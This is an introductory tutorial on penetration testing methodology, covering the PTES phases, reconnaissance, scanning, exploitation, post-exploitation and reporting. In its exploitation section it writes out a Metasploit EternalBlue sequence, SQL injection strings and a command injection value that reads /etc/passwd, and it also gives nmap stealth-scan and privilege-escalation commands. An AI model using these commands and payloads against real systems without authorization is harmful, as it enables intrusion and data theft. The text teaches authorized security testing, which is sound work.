Advanced Penetration Testing Methodology

Introduction to Penetration Testing

Penetration testing is a simulated cyber attack against your computer system to check for exploitable vulnerabilities. It's a critical component of a comprehensive security program.

Core Theory

Think of penetration testing as a "friendly burglar" scenario. Just as you might hire someone to test your home security by attempting to break in, penetration testing involves authorized professionals attempting to breach your digital defenses to identify weaknesses before real attackers do.

Types of Penetration Testing

By Knowledge Level

  • Black Box: No prior knowledge of the system
  • White Box: Full knowledge of the system
  • Gray Box: Limited knowledge of the system

By Target Type

  • Network Penetration Testing
  • Web Application Testing
  • Mobile Application Testing
  • Social Engineering Testing
  • Physical Security Testing

PTES (Penetration Testing Execution Standard)

PTES provides a comprehensive methodology for conducting penetration tests, ensuring consistency and thoroughness.

PTES Phases
  1. Pre-engagement Interactions: Scope definition and legal agreements
  2. Intelligence Gathering: Information collection about the target
  3. Threat Modeling: Identifying potential attack vectors
  4. Vulnerability Analysis: Finding security weaknesses
  5. Exploitation: Attempting to exploit vulnerabilities
  6. Post Exploitation: Maintaining access and gathering intelligence
  7. Reporting: Documenting findings and recommendations

Reconnaissance Phase

The reconnaissance phase involves gathering as much information as possible about the target without directly interacting with their systems.

Passive Reconnaissance

OSINT Sources

  • Search Engines: Google dorking, Bing, DuckDuckGo
  • Social Media: LinkedIn, Facebook, Twitter
  • Public Records: WHOIS, DNS records
  • Job Postings: Technology stack information

Tools & Techniques

  • theHarvester: Email and subdomain enumeration
  • Maltego: Link analysis and data mining
  • Shodan: Internet-connected device search
  • Recon-ng: Web reconnaissance framework
# Example: Using theHarvester for email enumeration theharvester -d target.com -l 500 -b google # Example: Google dorking for sensitive files site:target.com filetype:pdf site:target.com inurl:admin site:target.com intitle:"index of"

Scanning & Enumeration

Active reconnaissance involves directly interacting with the target systems to gather detailed information.

Network Scanning

# Network discovery nmap -sn 192.168.1.0/24 # Port scanning nmap -sS -sV -O target.com # Comprehensive scan nmap -A -T4 -p- target.com # Stealth scan nmap -sS -f -D RND:10 target.com

Service Enumeration

Common Services

  • HTTP/HTTPS (80/443): Web applications
  • SSH (22): Secure shell access
  • FTP (21): File transfer protocol
  • SMB (445): Windows file sharing
  • DNS (53): Domain name resolution

Enumeration Tools

  • Nmap NSE scripts
  • enum4linux: SMB enumeration
  • dirb/gobuster: Directory bruteforcing
  • nikto: Web vulnerability scanner

Exploitation Phase

The exploitation phase involves attempting to gain unauthorized access to systems by leveraging identified vulnerabilities.

Ethical Guidelines

Always ensure you have explicit written authorization before attempting any exploitation. Unauthorized access is illegal and unethical.

Common Exploitation Techniques

# Metasploit Framework msfconsole use exploit/windows/smb/ms17_010_eternalblue set RHOSTS target_ip set LHOST attacker_ip exploit # Manual exploitation example # SQL Injection ' OR '1'='1' -- ' UNION SELECT 1,2,3,4,5 -- # Command Injection ; cat /etc/passwd | whoami

Post-Exploitation

After gaining initial access, post-exploitation activities focus on maintaining access, escalating privileges, and gathering intelligence.

Key Activities

Privilege Escalation

  • Linux: SUID binaries, kernel exploits
  • Windows: Token impersonation, service misconfigurations
  • Database: SQL injection to system commands

Persistence

  • Backdoors: Hidden access methods
  • Scheduled Tasks: Automated execution
  • Registry Modifications: Windows persistence
# Linux privilege escalation find / -perm -4000 -type f 2>/dev/null sudo -l cat /etc/crontab # Windows privilege escalation whoami /priv net user systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

Reporting & Documentation

Comprehensive reporting is crucial for communicating findings and providing actionable recommendations.

Report Structure

Professional Report Components
  1. Executive Summary: High-level overview for management
  2. Methodology: Testing approach and scope
  3. Findings Summary: Vulnerability overview with risk ratings
  4. Detailed Findings: Technical details and proof of concept
  5. Recommendations: Remediation steps and best practices
  6. Appendices: Supporting documentation and evidence
